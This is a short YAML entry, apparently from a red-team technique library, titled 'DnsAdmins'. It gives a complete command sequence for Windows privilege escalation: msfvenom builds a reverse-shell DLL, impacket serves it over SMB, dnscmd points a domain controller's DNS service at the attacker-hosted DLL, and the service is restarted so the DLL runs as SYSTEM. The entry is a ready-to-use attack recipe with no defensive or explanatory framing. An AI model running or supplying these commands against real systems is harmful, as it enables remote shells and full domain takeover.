name: DnsAdmins
description: DnsAdmins can inject a DLL into DNS service running as SYSTEM on DC
commands:
- '# Create malicious DLL'
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o evil.dll
- ''
- '# Host on SMB share'
- impacket-smbserver share /path/to/dll
- ''
- '# Configure DNS to load DLL'
- dnscmd <DC> /config /serverlevelplugindll \\<ATTACKER_IP>\share\evil.dll
- ''
- '# Restart DNS (requires reboot or service restart)'
- sc \\<DC> stop dns && sc \\<DC> start dns
opsec: []
references: []
